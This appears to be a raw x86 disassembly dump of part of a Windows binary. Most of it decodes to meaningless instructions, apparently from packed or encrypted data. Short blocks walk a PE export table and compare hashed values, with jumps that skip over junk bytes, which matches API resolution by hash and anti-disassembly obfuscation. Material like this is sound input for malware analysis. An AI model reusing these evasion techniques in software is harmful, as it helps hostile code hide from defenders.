  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	sbb    al,0x6a
  403099:	std    
  40309a:	dec    ebx
  40309b:	xchg   edx,eax
  40309c:	adc    eax,0x7efe7878
  4030a1:	js     0x40311b
  4030a3:	test   al,0x8a
  4030a5:	rcl    DWORD PTR [ebp-0x839db3d],cl
  4030ab:	mov    esi,0x1b199ed
  4030b0:	ror    esp,cl
  4030b2:	cmp    DWORD PTR [ebp-0x36],eax
  4030b5:	jmp    0x22c6b58c
  4030ba:	cwde   
  4030bb:	ret    
  4030bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030bd:	out    0x7f,eax
  4030bf:	adc    bh,BYTE PTR [eax]
  4030c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030c2:	xor    al,0x58
  4030c4:	pop    edx
  4030c5:	pop    ds
  4030c6:	inc    ecx
  4030c7:	push   edx
  4030c8:	mov    cl,0x53
  4030ca:	gs jecxz 0x4030c4
  4030cd:	lahf   
  4030ce:	sbb    ebx,DWORD PTR [ecx-0x349c7f43]
  4030d4:	repnz es pop ebx
  4030d7:	mov    esp,0x415260ec
  4030dc:	sbb    BYTE PTR [ecx],bh
  4030de:	aaa    
  4030df:	cmp    BYTE PTR [edi],ch
  4030e1:	add    BYTE PTR [edx-0x77],bl
  4030e4:	sbb    cl,al
  4030e6:	icebp  
  4030e7:	inc    edi
  4030e8:	popf   
  4030e9:	push   cs
  4030ea:	out    dx,al
  4030eb:	nop
  4030ec:	mov    ah,0x6a
  4030ee:	xor    BYTE PTR [ebx-0x76e76c01],ch
  4030f4:	outs   dx,BYTE PTR ds:[esi]
  4030f5:	clc    
  4030f6:	mov    eax,ds:0xa69ee4bf
  4030fb:	(bad)  
  4030fc:	sbb    al,0xe7
  4030fe:	mov    al,0xc1
  403100:	pusha  
  403101:	xor    DWORD PTR [ecx-0x14e02ce4],edi
  403107:	ds popa 
  403109:	in     al,0x52
  40310b:	les    ecx,FWORD PTR [ecx+0x76]
  40310e:	lods   eax,DWORD PTR ds:[esi]
  40310f:	fnstcw WORD PTR [edi+0x3e]
  403112:	je     0x4030b5
  403114:	ins    BYTE PTR es:[edi],dx
  403115:	data16 ins BYTE PTR es:[edi],dx
  403117:	mov    cl,0xd0
  403119:	test   al,0xbb
  40311b:	pop    ebx
  40311c:	nop
  40311d:	or     DWORD PTR [edi+0x73],0xffffffe1
  403121:	retf   0x746
  403124:	mov    esi,0xe46d32bf
  403129:	or     DWORD PTR [ebp-0x67],ecx
  40312c:	xchg   ecx,eax
  40312d:	in     eax,0x88
  40312f:	cmp    DWORD PTR [ebx],0x78
  403132:	add    edx,DWORD PTR [esi+0x1ad4e2e5]
  403138:	aas    
  403139:	dec    ebx
  40313a:	inc    esi
  40313b:	jno    0x403167
  40313d:	in     al,dx
  40313e:	enter  0x98a3,0x22
  403142:	fwait
  403143:	mov    edi,0xb64f8e6
  403148:	sub    al,0xcf
  40314a:	fisttp QWORD PTR [ecx+0xf]
  40314d:	sub    esp,DWORD PTR [edi-0x769009dd]
  403153:	lods   al,BYTE PTR ds:[esi]
  403154:	jmp    0x4030f2
  403156:	xchg   BYTE PTR [edx+0x51],bl
  403159:	add    eax,0x9cd4851f
  40315e:	mov    ch,ah
  403160:	fwait
  403161:	push   ss
  403162:	mov    al,ds:0x267ba8bf
  403167:	or     edi,DWORD PTR [edi+ebp*2]
  40316a:	aaa    
  40316b:	xchg   edx,eax
  40316c:	sub    esp,DWORD PTR [ebx-0x3fc01c6c]
  403172:	fmul   DWORD PTR [esi+ecx*1-0x7c2b2afe]
  403179:	(bad)  
  40317a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40317b:	sbb    DWORD PTR [ebp+0x3f],0x55
  40317f:	sbb    BYTE PTR [ebx+0x566a2b09],al
  403185:	add    edx,ebp
  403187:	or     DWORD PTR [ecx],ecx
  403189:	mov    eax,DWORD PTR [edi+0x66]
  40318c:	jp     0x40312b
  40318e:	loope  0x403184
  403190:	ins    DWORD PTR es:[edi],dx
  403191:	out    0x13,al
  403193:	or     DWORD PTR [ecx],esi
  403195:	ds cmp ah,dl
  403198:	(bad)  
  403199:	out    0xe0,al
  40319b:	retf   0x8c0b
  40319e:	jb     0x40319d
  4031a0:	test   BYTE PTR gs:[edx-0x57],al
  4031a4:	ins    DWORD PTR es:[edi],dx
  4031a5:	mov    bh,0xc8
  4031a7:	dec    edi
  4031a8:	popw   es
  4031aa:	int3   
  4031ab:	inc    ecx
  4031ac:	add    ch,BYTE PTR [esp+ebp*2+0x14c63dbe]
  4031b3:	dec    esi
  4031b4:	xchg   edx,eax
  4031b5:	push   ebx
  4031b6:	je     0x4031ae
  4031b8:	mov    ds:0x5a42001f,eax
  4031bd:	retf   0x79fc
  4031c0:	mov    ?,WORD PTR [ebx+ecx*2]
  4031c3:	out    0xf3,eax
  4031c5:	cdq    
  4031c6:	mov    eax,ds:0xcfc8f53a
  4031cb:	repz cs aam 0xbf
  4031cf:	or     DWORD PTR [edx+0x56],ebp
  4031d2:	dec    ebx
  4031d3:	ficomp DWORD PTR [ebp-0x428a168c]
  4031d9:	jnp    0x40317c
  4031db:	lods   eax,DWORD PTR gs:[esi]
  4031dd:	or     dl,BYTE PTR ds:[edx]
  4031e0:	push   ecx
  4031e1:	test   DWORD PTR [ebp+0x41e6cd80],ebp
  4031e7:	lea    edx,[ebx-0x9d570ae]
  4031ed:	xchg   ebx,eax
  4031ee:	rol    ebx,1
  4031f0:	js     0x4031ed
  4031f2:	dec    eax
  4031f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031f4:	data16 add BYTE PTR [eax],cl
  4031f7:	hlt    
  4031f8:	mov    ?,WORD PTR [ebp-0x53c63bcc]
  4031fe:	jle    0x4031d6
  403200:	popf   
  403201:	adc    dh,BYTE PTR [eax-0x31]
  403204:	fld    DWORD PTR ds:0xb10f5e4a
  40320a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40320b:	das    
  40320c:	adc    eax,0xab34cb50
  403211:	pop    ebx
  403212:	pushf  
  403213:	xlat   BYTE PTR ds:[ebx]
  403214:	out    dx,al
  403215:	mov    DWORD PTR [esi+0x40be9df8],eax
  40321b:	pop    edx
  40321c:	(bad)  
  40321d:	aam    0x65
  40321f:	sub    DWORD PTR [ebp-0x5ffbc6bc],0x44
  403226:	cld    
  403227:	icebp  
  403228:	js     0x403283
  40322a:	sub    ebp,DWORD PTR [esi+eax*2+0x18]
  40322e:	popf   
  40322f:	mov    ecx,0x162260f0
  403234:	sbb    esp,DWORD PTR [edx+0xf]
  403237:	and    al,0x9a
  403239:	sub    DWORD PTR [ebp+0x7c],edi
  40323c:	xchg   DWORD PTR [ebp-0x2a08070],ebx
  403242:	pop    edi
  403243:	icebp  
  403244:	xor    bl,BYTE PTR [edi+0x3f9ad2a5]
  40324a:	push   ebx
  40324b:	jp     0x403296
  40324d:	mov    ds:0xb25dc01d,eax
  403252:	fst    DWORD PTR [edi-0x7608be4c]
  403258:	inc    ebx
  403259:	mov    dh,0x4f
  40325b:	(bad)  
  40325c:	lea    edi,[esi]
  40325e:	pop    ebp
  40325f:	leave  
  403260:	mov    ecx,0xdf72b4db
  403265:	adc    BYTE PTR [edx],cl
  403267:	leave  
  403268:	call   0xd32b583c
  40326d:	xor    edx,DWORD PTR [edi-0x51b6381]
  403273:	popa   
  403274:	daa    
  403275:	inc    ebx
  403276:	and    al,0x24
  403278:	cdq    
  403279:	cdq    
  40327a:	cmp    dl,BYTE PTR [ecx-0x1b]
  40327d:	outs   dx,BYTE PTR ds:[esi]
  40327e:	jae    0x4032b8
  403280:	loop   0x4032fd
  403282:	xor    BYTE PTR [esi-0x7907d990],ch
  403288:	add    eax,0xc0c5909d
  40328d:	pop    edx
  40328e:	loop   0x403224
  403290:	adc    eax,0xc0fc58d6
  403295:	es aam 0x4d
  403298:	not    BYTE PTR [ecx]
  40329a:	xchg   ebp,eax
  40329b:	cli    
  40329c:	int3   
  40329d:	add    DWORD PTR [edi-0x7ecf5a08],eax
  4032a3:	sub    BYTE PTR [edx+0x49],al
  4032a6:	mov    bl,0x1a
  4032a8:	nop
  4032a9:	cli    
  4032aa:	mov    ebx,0x410a5bc
  4032af:	xor    eax,0x7b573bba
  4032b4:	nop
  4032b5:	adc    ecx,ebx
  4032b7:	ins    DWORD PTR es:[edi],dx
  4032b8:	dec    eax
  4032b9:	xor    eax,0x18328767
  4032be:	fiadd  DWORD PTR [eax+0x28ea1796]
  4032c4:	pop    edx
  4032c5:	dec    edi
  4032c6:	pop    edx
  4032c7:	inc    eax
  4032c8:	arpl   ax,bp
  4032ca:	inc    edx
  4032cb:	shl    DWORD PTR [ecx],1
  4032cd:	jb     0x40329a
  4032cf:	pop    ebx
  4032d0:	xchg   esp,eax
  4032d1:	xlat   BYTE PTR ds:[ebx]
  4032d2:	and    BYTE PTR [esi+edi*2],dh
  4032d5:	pop    ecx
  4032d6:	mov    ds:0xa89fe49d,al
  4032db:	fdivr  st,st(4)
  4032dd:	sbb    DWORD PTR [ebx-0xf],0x2d805014
  4032e4:	mov    es,WORD PTR [edi-0x6446d3bd]
  4032ea:	sub    al,0x51
  4032ec:	cs dec eax
  4032ee:	sbb    ah,BYTE PTR [esi-0x56]
  4032f1:	ret    0x6082
  4032f4:	push   es
  4032f5:	fst    st(2)
  4032f7:	cmp    eax,edi
  4032f9:	retf   
  4032fa:	mov    bl,0xf4
  4032fc:	test   eax,0x2d571276
  403301:	iret   
  403302:	and    edx,edi
  403304:	nop
  403305:	(bad)  
  403307:	jo     0x40337e
  403309:	rol    DWORD PTR [edi-0x7ad10895],cl
  40330f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403310:	pop    ebp
  403311:	stc    
  403312:	outs   dx,BYTE PTR ds:[esi]
  403313:	and    DWORD PTR [eax-0x617004c6],ecx
  403319:	popa   
  40331a:	mov    edx,0x3a863fa0
  40331f:	xchg   ecx,eax
  403320:	out    dx,eax
  403321:	daa    
  403322:	pop    ds
  403323:	push   ds
  403324:	shl    DWORD PTR [ebx],1
  403326:	mov    BYTE PTR [ebx],0xc7
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx-0x743dc34a]
  403372:	mov    edi,0x1a10046b
  403377:	js     0x4033f1
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x4033ea
  40337e:	sti    
  40337f:	or     BYTE PTR [ebx+esi*1],al
  403382:	add    bh,ch
  403384:	sti    
  403385:	mov    ecx,0x826d8b7e
  40338a:	ja     0x4033c1
  40338c:	push   ds
  40338d:	pop    ebp
  40338e:	adc    al,0x5b
  403390:	adc    DWORD PTR [ebx+0x3],ebp
  403393:	ss pop ss
  403395:	addr16 ret 0x17fb
  403399:	xor    BYTE PTR [edx],0xd6
  40339c:	pop    esi
  40339d:	xor    esi,DWORD PTR [eax+0x57]
  4033a0:	lock xchg esp,eax
  4033a2:	push   ds
  4033a3:	mov    esi,0xd075f1ba
  4033a8:	and    BYTE PTR [edx],ah
  4033aa:	sahf   
  4033ab:	sub    cl,dh
  4033ad:	and    BYTE PTR [edx-0x30113eaf],al
  4033b3:	dec    esi
  4033b4:	xchg   ecx,eax
  4033b5:	in     eax,0x3c
  4033b7:	mov    bl,0x99
  4033b9:	mul    BYTE PTR [eax+0x4a8dfcee]
  4033bf:	(bad)  
  4033c1:	test   al,0x34
  4033c3:	pop    ds
  4033c4:	jg     0x40342f
  4033c6:	mov    dh,0xa6
  4033c8:	ja     0x4033b7
  4033ca:	cs jno 0x403410
  4033cd:	mov    dh,0xee
  4033cf:	int3   
  4033d0:	mov    edx,0xfa0e7b0a
  4033d5:	jno    0x403393
  4033d7:	xchg   esi,eax
  4033d8:	adc    ah,BYTE PTR [eax+0x25]
  4033db:	fcmovbe st,st(2)
  4033dd:	add    al,0x15
  4033df:	aaa    
  4033e0:	push   esi
  4033e1:	and    eax,0x1d41d60c
  4033e6:	xchg   ebx,eax
  4033e7:	std    
  4033e8:	push   edi
  4033e9:	je     0x40338e
  4033eb:	ret    0xbef4
  4033ee:	fistp  QWORD PTR [esi]
  4033f0:	imul   esp,DWORD PTR [eax+0x1],0xffffff98
  4033f4:	das    
  4033f5:	cmc    
  4033f6:	push   esi
  4033f7:	xlat   BYTE PTR ds:[ebx]
  4033f8:	xchg   DWORD PTR [edi],ebx
  4033fa:	jmp    0x8b0d2cbd
  4033ff:	mov    WORD PTR [edi+0x6624a736],?
  403405:	adc    eax,0xda93fe4
  40340a:	xor    al,0xca
  40340c:	call   0x13e93771
  403411:	dec    ebp
  403412:	iret   
  403413:	pop    edi
  403414:	jo     0x4033a0
  403416:	ficomp WORD PTR [ebp-0x5b6cd976]
  40341c:	pop    fs
  40341e:	shr    BYTE PTR [edi*2+0x5bb17717],1
  403425:	xor    dh,BYTE PTR [ebx]
  403427:	jo     0x403469
  403429:	test   DWORD PTR [ebp+0x68],0x7230c2be
  403430:	or     al,0x57
  403432:	mov    cl,0xde
  403434:	retf   
  403435:	inc    edx
  403436:	mov    edx,DWORD PTR [ebp+eax*4-0x8879e02]
  40343d:	scas   eax,DWORD PTR es:[edi]
  40343e:	inc    esp
  40343f:	out    0xf9,al
  403441:	add    bh,ch
  403443:	daa    
  403444:	fwait
  403445:	(bad)  
  403446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403447:	jne    0x40349f
  403449:	add    BYTE PTR [ebx+eiz*4-0xc],bl
  40344d:	dec    esp
  40344e:	(bad)  
  40344f:	fisub  WORD PTR [ecx-0x5328e809]
  403455:	aaa    
  403456:	sub    al,0xa9
  403458:	inc    edi
  403459:	sbb    BYTE PTR [eax],bl
  40345b:	jnp    0x40345a
  40345d:	lahf   
  40345e:	jo     0x4033eb
  403460:	push   di
  403462:	lea    ebx,ds:0xb54ccfa4
  403468:	dec    ebp
  403469:	mov    fs:0xa152c144,eax
  40346f:	jno    0x40342d
  403471:	retf   
  403472:	out    dx,eax
  403473:	and    cl,ch
  403475:	sub    eax,0xab0a6260
  40347a:	retf   0x8f02
  40347d:	jg     0x40348a
  40347f:	jmp    FWORD PTR [edi]
  403481:	pushf  
  403482:	cs dec esp
  403484:	int    0x1b
  403486:	add    edi,esp
  403488:	dec    esi
  403489:	inc    esi
  40348a:	call   0x48ed:0xe62d541f
  403491:	mov    bl,0x59
  403493:	movups xmm2,XMMWORD PTR [edx-0x28c954c2]
  40349a:	or     al,0x32
  40349c:	sub    BYTE PTR [ebx-0x4d],0x5b
  4034a0:	sbb    ah,BYTE PTR [esi+0x48fde91]
  4034a6:	sub    eax,0xb03ed240
  4034ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034ac:	lahf   
  4034ad:	jbe    0x40349c
  4034af:	push   esi
  4034b0:	xchg   edx,eax
  4034b1:	and    eax,0x1f7df69
  4034b6:	mov    dl,0x74
  4034b8:	jp     0x4034c9
  4034ba:	icebp  
  4034bb:	jo     0x4034dc
  4034bd:	scas   eax,DWORD PTR es:[edi]
  4034be:	cs jg  0x4034a1
  4034c1:	stc    
  4034c2:	mov    esp,0xb73e9f90
  4034c7:	in     eax,dx
  4034c8:	enter  0x1cab,0x81
  4034cc:	and    ah,BYTE PTR ds:0xc5fb01be
  4034d2:	xor    al,0xe3
  4034d4:	or     ch,bl
  4034d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034d7:	xchg   esp,eax
  4034d8:	scas   al,BYTE PTR es:[edi]
  4034d9:	xchg   edx,eax
  4034da:	inc    edi
  4034db:	fcom   QWORD PTR [edx]
  4034dd:	test   al,0x92
  4034df:	ds loope 0x403469
  4034e2:	sti    
  4034e3:	jb     0x4034e7
  4034e5:	xchg   esp,eax
  4034e6:	xchg   esp,eax
  4034e7:	test   eax,0x4a8eef3a
  4034ec:	in     eax,dx
  4034ed:	xor    DWORD PTR [eax-0x58],ecx
  4034f0:	addr16 push ecx
  4034f2:	xor    DWORD PTR [eax-0x11724ef],esp
  4034f8:	mov    al,ds:0x5618cf3f
  4034fd:	leave  
  4034fe:	or     esp,DWORD PTR [esi-0xa2fd042]
  403504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403505:	push   edx
  403506:	stos   BYTE PTR es:[edi],al
  403507:	call   0xb0ac55ff
  40350c:	cmp    dh,bl
  40350e:	pushf  
  40350f:	add    BYTE PTR [esi-0x35],al
  403512:	adc    al,0x1b
  403514:	sub    al,0xca
  403516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403517:	(bad)  
  403518:	fdiv   DWORD PTR fs:[ecx+eax*8-0x5c]
  40351d:	add    al,0x33
  40351f:	and    DWORD PTR [edx-0xb1019c1],esi
  403525:	push   es
  403526:	mov    esi,0x6b4a66ef
  40352b:	sti    
  40352c:	repnz and esp,DWORD PTR [ebx+0x47dec17b]
  403533:	mov    edx,DWORD PTR [ebx-0x2f294ddc]
  403539:	xor    bh,BYTE PTR [ecx-0x59]
  40353c:	jp     0x4034d4
  40353e:	jmp    FWORD PTR [edi+0x357fd9c1]
  403544:	fistp  DWORD PTR [ecx+ecx*8-0x4de1d0e9]
  40354b:	lock aad 0x1e
  40354e:	push   esp
  40354f:	test   DWORD PTR [ecx+0x6f72ea17],ebp
  403555:	dec    ebp
  403556:	cmp    eax,0xf96d5352
  40355b:	pop    ecx
  40355c:	or     BYTE PTR [ecx],ah
  40355e:	scas   al,BYTE PTR es:[edi]
  40355f:	je     0x403523
  403561:	dec    esp
  403562:	out    0x8e,eax
  403564:	push   ecx
  403565:	repz mov eax,ds:0x2dc8415b
  40356b:	xor    DWORD PTR [ebp-0x4d],edx
  40356e:	inc    esi
  40356f:	sub    al,0xe2
  403571:	ss cld 
  403573:	mov    bl,0x38
  403575:	sbb    ch,cl
  403577:	add    esi,DWORD PTR [ebx-0x30fdf9d5]
  40357d:	jno    0x4035c9
  40357f:	fild   DWORD PTR [ecx]
  403581:	dec    eax
  403582:	test   eax,0x99caa7c6
  403587:	imul   ecx,edi,0x8086c71c
  40358d:	neg    DWORD PTR [ebp-0x70]
  403590:	sbb    ecx,DWORD PTR [esi]
  403592:	imul   ebx,DWORD PTR [eax+edi*4-0x3d1947ea],0xc6dbdf10
  40359d:	sub    eax,0x35b46e0b
  4035a2:	mov    bh,0x4a
  4035a4:	nop
  4035a5:	jmp    0x4035b9
  4035a7:	jnp    0x403620
  4035a9:	sub    eax,eax
  4035ab:	(bad)
  4035af:	xchg   ebx,eax
  4035b0:	cmc    
  4035b1:	fsubr  QWORD PTR [ecx+ebx*2-0x2f7c6d42]
  4035b8:	xchg   esp,eax
  4035b9:	out    dx,eax
  4035ba:	call   0x5191bc07
  4035bf:	push   esp
  4035c0:	sbb    al,0x9d
  4035c2:	and    BYTE PTR [ecx-0x4a7270],ch
  4035c8:	stos   DWORD PTR es:[edi],eax
  4035c9:	sbb    eax,0x710c8452
  4035ce:	cld    
  4035cf:	mov    edi,0xb22d458
  4035d4:	jb     0x403598
  4035d6:	pop    eax
  4035d7:	add    ebp,DWORD PTR [eax]
  4035d9:	pop    ecx
  4035da:	mov    cl,0xd8
  4035dc:	(bad)  
  4035de:	lock test dl,dl
  4035e1:	inc    ebx
  4035e2:	dec    eax
  4035e3:	hlt    
  4035e4:	retf   
  4035e5:	bswap  edi
  4035e7:	push   ebp
  4035e8:	jne    0x4035ca
  4035ea:	mov    dh,0x51
  4035ec:	mov    ds:0xb89fab74,al
  4035f1:	push   es
  4035f2:	and    edi,DWORD PTR [edi-0x3a9a1d7a]
  4035f8:	std    
  4035f9:	sub    BYTE PTR [edi+0xc],bl
  4035fc:	add    eax,0xc633e23f
  403601:	add    eax,edi
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0xd55a2e69,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x40361f
  40363f:	shl    BYTE PTR [edi+0x1c],1
  403642:	pop    ebx
  403643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403644:	sub    eax,0x8856a390
  403649:	jb     0x40368a
  40364b:	mov    eax,0xc6bd4454
  403650:	cmp    BYTE PTR ds:0xcb2c1717,ah
  403656:	dec    edx
  403657:	movaps xmm5,XMMWORD PTR [eax+0x376dd464]
  40365e:	push   esp
  40365f:	fld    QWORD PTR [esi]
  403661:	xchg   esi,eax
  403662:	daa    
  403663:	and    ecx,DWORD PTR [ebx-0x7]
  403666:	dec    eax
  403667:	xor    dh,dl
  403669:	xchg   edi,eax
  40366a:	sbb    eax,edi
  40366c:	sbb    ebx,0xf
  40366f:	jecxz  0x4036c4
  403671:	nop
  403672:	fisttp QWORD PTR [eax-0x597e2204]
  403678:	lahf   
  403679:	test   DWORD PTR [esi+0x5b],edx
  40367c:	mov    eax,ds:0x5ab415da
  403681:	sti    
  403682:	xchg   ebx,eax
  403683:	dec    esi
  403684:	push   es
  403685:	fstp   DWORD PTR [eax]
  403687:	pop    esp
  403688:	daa    
  403689:	jle    0x403637
  40368b:	or     al,BYTE PTR [ecx-0x6c]
  40368e:	addr16 adc al,0x57
  403691:	cmc    
  403692:	sub    eax,0xa0de5181
  403697:	and    ch,BYTE PTR ds:0x1eed768
  40369d:	inc    edx
  40369e:	adc    esi,DWORD PTR [ebx+ebp*1-0x3b]
  4036a2:	rcr    ebx,0xea
  4036a5:	push   ecx
  4036a6:	pop    edx
  4036a7:	mov    al,0x19
  4036a9:	in     al,0x7f
  4036ab:	cmp    BYTE PTR [esi+0x60],ah
  4036ae:	add    BYTE PTR [edi],dl
  4036b0:	and    ebx,DWORD PTR [ebx]
  4036b2:	lahf   
  4036b3:	in     al,dx
  4036b4:	xor    BYTE PTR [edx-0x161f1d8a],0x9c
  4036bb:	adc    DWORD PTR cs:[edx-0x6093c1fc],edx
  4036c2:	push   ebx
  4036c3:	cmp    BYTE PTR [edx+0x20cac301],ah
  4036c9:	ss jecxz 0x403708
  4036cc:	pop    ds
  4036cd:	sbb    bh,BYTE PTR [edi+0x15]
  4036d0:	sbb    ebp,ebx
  4036d2:	in     eax,0x4f
  4036d4:	dec    esp
  4036d5:	xor    bl,BYTE PTR [ebp+0xd41725a]
  4036db:	(bad)  
  4036dc:	cmc    
  4036dd:	cmc    
  4036de:	popf   
  4036df:	ret    
  4036e0:	sbb    DWORD PTR [esi-0x23adef42],esi
  4036e6:	loope  0x40367e
  4036e8:	xchg   edx,eax
  4036e9:	idiv   bl
  4036eb:	inc    ebp
  4036ec:	xchg   DWORD PTR [ecx+0x4ae659dc],ebp
  4036f2:	pusha  
  4036f3:	js     0x40376f
  4036f5:	out    0xac,al
  4036f7:	inc    edi
  4036f8:	pusha  
  4036f9:	sub    ch,BYTE PTR [eax]
  4036fb:	add    BYTE PTR [esi+0x1b1c2e2e],ch
  403701:	out    dx,eax
  403702:	stos   DWORD PTR es:[edi],eax
  403703:	mov    dh,0x0
  403705:	inc    ebp
  403706:	and    DWORD PTR [ebp-0x4],eax
  403709:	adc    dl,BYTE PTR [esi-0x7af5a0ca]
  40370f:	add    dh,BYTE PTR [ebx]
  403711:	in     eax,0x46
  403713:	adc    dh,BYTE PTR [ebx+0x72e91ee4]
  403719:	mul    esp
  40371b:	dec    ebp
  40371c:	push   ebp
  40371d:	jmp    0xea90bf2f
  403722:	mov    edx,0xcaade85
  403727:	sbb    al,0x9a
  403729:	in     al,dx
  40372a:	out    dx,eax
  40372b:	fst    DWORD PTR [esi-0x1d]
  40372e:	mov    ebp,DWORD PTR [ebp-0x52150bf0]
  403734:	mov    eax,DWORD PTR [edx+0x71c83d48]
  40373a:	adc    BYTE PTR [esi-0x28],cl
  40373d:	mov    al,ds:0xf061b8ed
  403742:	push   ss
  403743:	pop    ebx
  403744:	and    edx,DWORD PTR [ecx-0x74]
  403747:	test   BYTE PTR [edi-0x56],0xc1
  40374b:	xchg   ebx,eax
  40374c:	pop    edx
  40374d:	jg     0x40375f
  40374f:	fistp  WORD PTR [ebp+0x1d34f1c3]
  403755:	inc    edi
  403756:	(bad)  
  403757:	test   eax,0xecb7437c
  40375c:	cld    
  40375d:	hlt    
  40375e:	push   edi
  40375f:	retf   0xcccb
  403762:	sub    edi,DWORD PTR [eax]
  403764:	rcr    DWORD PTR [ebp-0x79],1
  403767:	push   ebp
  403768:	aaa    
  403769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40376a:	lds    edi,FWORD PTR [ebx]
  40376c:	add    ecx,eax
  40376e:	pop    edx
  40376f:	add    BYTE PTR [ecx],0x1
  403772:	loop   0x40370c
  403774:	mov    ecx,0xacef08c7
  403779:	call   0x4d79cb28
  40377e:	das    
  40377f:	add    BYTE PTR [ebp+0x58],ah
  403782:	dec    eax
  403783:	jae    0x4037b1
  403785:	jle    0x4037c1
  403787:	(bad)  
  403788:	cld    
  403789:	nop
  40378a:	cwde   
  40378b:	les    esi,FWORD PTR [ebp-0x52]
  40378e:	inc    ecx
  40378f:	into   
  403790:	(bad)  [esi-0x46]
  403793:	adc    BYTE PTR [edx+0x18b83774],bh
  403799:	(bad)  
  40379a:	ins    BYTE PTR es:[edi],dx
  40379b:	or     esp,esp
  40379d:	dec    ch
  40379f:	loope  0x403807
  4037a1:	fucomip st,st(0)
  4037a3:	fisttp DWORD PTR [edx]
  4037a5:	pop    eax
  4037a6:	sub    ebx,DWORD PTR [eax-0x644145e2]
  4037ac:	cmp    DWORD PTR [edi],ebx
  4037ae:	dec    ebx
  4037af:	test   al,0x91
  4037b1:	add    bl,cl
  4037b3:	xchg   esi,eax
  4037b4:	sti    
  4037b5:	cwde   
  4037b6:	ds in  al,dx
  4037b8:	hlt    
  4037b9:	xchg   ecx,eax
  4037ba:	mov    edi,ecx
  4037bc:	rcl    BYTE PTR [esi+0x24a35b91],cl
  4037c2:	push   edi
  4037c3:	or     eax,0x10628c9d
  4037c8:	rol    edx,1
  4037ca:	aad    0x76
  4037cc:	sahf   
  4037cd:	cld    
  4037ce:	xor    bl,BYTE PTR [ecx+0x559457e3]
  4037d4:	dec    ecx
  4037d5:	pop    eax
  4037d6:	repz in eax,0x14
  4037d9:	push   esi
  4037da:	sbb    BYTE PTR [ebx],ch
  4037dc:	cmp    DWORD PTR [edx],ebx
  4037de:	push   ebx
  4037df:	dec    edi
  4037e0:	icebp  
  4037e1:	mov    BYTE PTR [edx+0x6fd051d8],bl
  4037e7:	sub    BYTE PTR [ebx+eax*4+0x5f5103a9],al
  4037ee:	fwait
  4037ef:	inc    edx
  4037f0:	push   ss
  4037f1:	arpl   WORD PTR [ebx+ebp*8+0x3696e44f],ax
  4037f8:	cwde   
  4037f9:	scas   al,BYTE PTR es:[edi]
  4037fa:	dec    edi
  4037fb:	or     BYTE PTR [edi+0x5b],ah
  4037fe:	mov    DWORD PTR [edx],eax
  403800:	imul   ebx,DWORD PTR [esi+edi*1+0x47],0x7c3d19dc
  403808:	sub    al,dl
  40380a:	push   esi
  40380b:	jmp    0x26d6c328
  403810:	cmc    
  403811:	pop    ebx
  403812:	mov    eax,0x33412cee
  403817:	jnp    0x40388b
  403819:	mov    ds:0x39d7d042,al
  40381e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40381f:	scas   al,BYTE PTR es:[edi]
  403820:	out    dx,al
  403821:	push   0x98b55935
  403826:	xor    bl,BYTE PTR [edi+0x24]
  403829:	add    BYTE PTR [ecx-0x579d2d80],ch
  40382f:	popf   
  403830:	jns    0x40383f
  403832:	jg     0x40385d
  403834:	ss into 
  403836:	iret   
  403837:	push   esi
  403838:	inc    ecx
  403839:	ja     0x4037ee
  40383b:	lods   al,BYTE PTR ds:[esi]
  40383c:	pop    esi
  40383d:	dec    edx
  40383e:	mov    eax,ds:0x3f9943a7
  403843:	lahf   
  403844:	inc    eax
  403845:	sahf   
  403846:	stos   BYTE PTR es:[edi],al
  403847:	nop
  403848:	aad    0x78
